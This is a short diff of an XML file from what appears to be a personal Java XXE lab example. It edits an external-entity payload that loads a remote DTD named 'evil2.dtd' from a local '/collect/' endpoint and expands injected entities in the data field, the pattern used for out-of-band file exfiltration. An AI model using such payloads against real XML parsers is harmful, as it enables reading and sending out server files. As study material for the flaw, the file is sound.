@@ -1,9 +1,11 @@
-<?xml version="1.0" ?>
+<?xml version="1.0"?>
 <!DOCTYPE model [
-        <!ENTITY % asd SYSTEM "http://localhost:8888/collect/dtd/evil2.dtd">
+        <!ENTITY % asd SYSTEM "http://127.0.0.1:8888/collect/dtd/evil2.dtd">
         %asd;
+        %c;
         ]>
 <model>
-    <id>4</id>
-    <data>&c;</data>
+    <data>&rrr;</data>
 </model>
+
+        <!--file:///home/NIX/glebcher601/Documents/Others/Java Security/xxe-example/evil2.dtd-->
